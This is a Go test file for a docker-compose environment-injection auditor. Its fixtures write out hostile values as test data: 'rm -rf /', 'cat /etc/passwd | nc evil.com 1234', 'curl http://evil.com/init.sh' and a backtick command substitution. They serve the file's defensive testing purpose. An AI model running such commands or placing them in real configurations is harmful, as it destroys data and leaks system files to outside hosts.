package envinjection

import (
	"testing"

	"github.com/joeyvictorino/tasia/internal/collect"
	"github.com/joeyvictorino/tasia/internal/collect/compose"
)

func collected(services ...compose.Service) *collect.Collected {
	return &collect.Collected{
		Root: "/test",
		ComposeFiles: []compose.File{
			{Path: "docker-compose.yml", Services: services},
		},
	}
}

func TestAnalyze_Empty(t *testing.T) {
	r := Analyze(&collect.Collected{Root: "/empty"})
	if r.Summary.TotalServices != 0 {
		t.Fatalf("expected 0 services, got %d", r.Summary.TotalServices)
	}
}

func TestAnalyze_NoEnv(t *testing.T) {
	svc := compose.Service{Name: "web"}
	r := Analyze(collected(svc))
	if r.Summary.TotalFindings != 0 {
		t.Fatalf("expected 0 findings, got %d", r.Summary.TotalFindings)
	}
}

func TestShellMetachar_Semicolon(t *testing.T) {
	svc := compose.Service{
		Name:        "app",
		Environment: []string{"CMD=echo hello; rm -rf /"},
	}
	r := Analyze(collected(svc))
	if r.Summary.ShellMetachar != 1 {
		t.Fatal("expected shell metachar finding for semicolon")
	}
}

func TestShellMetachar_Pipe(t *testing.T) {
	svc := compose.Service{
		Name:        "app",
		Environment: []string{"CMD=cat /etc/passwd | nc evil.com 1234"},
	}
	r := Analyze(collected(svc))
	if r.Summary.ShellMetachar != 1 {
		t.Fatal("expected shell metachar finding for pipe")
	}
}

func TestShellMetachar_Backtick(t *testing.T) {
	svc := compose.Service{
		Name:        "app",
		Environment: []string{"VAL=`whoami`"},
	}
	r := Analyze(collected(svc))
	if r.Summary.ShellMetachar != 1 {
		t.Fatal("expected shell metachar finding for backtick")
	}
}

func TestInterpolation_DollarBrace(t *testing.T) {
	svc := compose.Service{
		Name:        "app",
		Environment: []string{"DB_URL=${DATABASE_HOST}:5432"},
	}
	r := Analyze(collected(svc))
	if r.Summary.Interpolation != 1 {
		t.Fatal("expected interpolation finding")
	}
}

func TestInterpolation_DollarVar(t *testing.T) {
	svc := compose.Service{
		Name:        "app",
		Environment: []string{"HOME_DIR=$HOME/data"},
	}
	r := Analyze(collected(svc))
	if r.Summary.Interpolation != 1 {
		t.Fatal("expected interpolation finding for $HOME")
	}
}

func TestSensitiveEmpty(t *testing.T) {
	svc := compose.Service{
		Name:        "app",
		Environment: []string{"DB_PASSWORD="},
	}
	r := Analyze(collected(svc))
	if r.Summary.SensitiveEmpty != 1 {
		t.Fatal("expected sensitive empty finding")
	}
}

func TestSensitiveEmpty_Token(t *testing.T) {
	svc := compose.Service{
		Name:        "app",
		Environment: []string{"API_TOKEN="},
	}
	r := Analyze(collected(svc))
	if r.Summary.SensitiveEmpty != 1 {
		t.Fatal("expected sensitive empty finding for TOKEN")
	}
}

func TestSensitiveInline(t *testing.T) {
	svc := compose.Service{
		Name:        "app",
		Environment: []string{"DB_PASSWORD=hunter2"},
	}
	r := Analyze(collected(svc))
	if r.Summary.SensitiveInline != 1 {
		t.Fatal("expected sensitive inline finding")
	}
}

func TestSensitiveInline_NotWhenInterpolated(t *testing.T) {
	svc := compose.Service{
		Name:        "app",
		Environment: []string{"DB_PASSWORD=${SECRET_FROM_VAULT}"},
	}
	r := Analyze(collected(svc))
	if r.Summary.SensitiveInline != 0 {
		t.Fatal("should not flag interpolated sensitive var as inline")
	}
}

func TestCommandValue(t *testing.T) {
	svc := compose.Service{
		Name:        "app",
		Environment: []string{"INIT=bash -c 'do stuff'"},
	}
	r := Analyze(collected(svc))
	if r.Summary.CommandValue != 1 {
		t.Fatal("expected command value finding")
	}
}

func TestCommandValue_Curl(t *testing.T) {
	svc := compose.Service{
		Name:        "app",
		Environment: []string{"SETUP=curl http://evil.com/init.sh"},
	}
	r := Analyze(collected(svc))
	if r.Summary.CommandValue != 1 {
		t.Fatal("expected command value finding for curl")
	}
}

func TestCommandValue_AbsPath(t *testing.T) {
	svc := compose.Service{
		Name:        "app",
		Environment: []string{"HOOK=/bin/sh -c 'payload'"},
	}
	r := Analyze(collected(svc))
	if r.Summary.CommandValue != 1 {
		t.Fatal("expected command value finding for /bin/sh")
	}
}

func TestDuplicateKey(t *testing.T) {
	svc := compose.Service{
		Name:        "app",
		Environment: []string{"FOO=bar", "FOO=baz"},
	}
	r := Analyze(collected(svc))
	if r.Summary.DuplicateKey != 1 {
		t.Fatal("expected duplicate key finding")
	}
}

func TestDuplicateKey_CaseInsensitive(t *testing.T) {
	svc := compose.Service{
		Name:        "app",
		Environment: []string{"foo=bar", "FOO=baz"},
	}
	r := Analyze(collected(svc))
	if r.Summary.DuplicateKey != 1 {
		t.Fatal("expected duplicate key finding (case-insensitive)")
	}
}

func TestNormalEnv_NoFindings(t *testing.T) {
	svc := compose.Service{
		Name:        "app",
		Environment: []string{"NODE_ENV=production", "PORT=3000"},
	}
	r := Analyze(collected(svc))
	if r.Summary.TotalFindings != 0 {
		t.Fatalf("expected 0 findings for normal env, got %d", r.Summary.TotalFindings)
	}
}

func TestNoEquals_NoValue(t *testing.T) {
	svc := compose.Service{
		Name:        "app",
		Environment: []string{"JUST_A_KEY"},
	}
	r := Analyze(collected(svc))
	if r.Summary.ShellMetachar != 0 {
		t.Fatal("should not flag key without value")
	}
}

func TestFormatText(t *testing.T) {
	svc := compose.Service{
		Name:        "app",
		Environment: []string{"DB_PASSWORD=hunter2"},
	}
	r := Analyze(collected(svc))
	text := FormatText(r)
	if text == "" {
		t.Fatal("FormatText returned empty")
	}
	if !containsStr(text, "Environment Injection Audit") {
		t.Fatal("missing header")
	}
}

func TestFormatText_Empty(t *testing.T) {
	r := Analyze(&collect.Collected{Root: "/empty"})
	text := FormatText(r)
	if !containsStr(text, "0 findings") {
		t.Fatal("should show 0 findings")
	}
}

func TestMultipleServices(t *testing.T) {
	svc1 := compose.Service{
		Name:        "a",
		Environment: []string{"DB_PASSWORD=secret1"},
	}
	svc2 := compose.Service{
		Name:        "b",
		Environment: []string{"API_KEY=secret2"},
	}
	r := Analyze(collected(svc1, svc2))
	if r.Summary.TotalServices != 2 {
		t.Fatalf("expected 2 services, got %d", r.Summary.TotalServices)
	}
	if r.Summary.SensitiveInline != 2 {
		t.Fatalf("expected 2 sensitive inline findings, got %d", r.Summary.SensitiveInline)
	}
}

func containsStr(s, sub string) bool {
	for i := 0; i <= len(s)-len(sub); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}
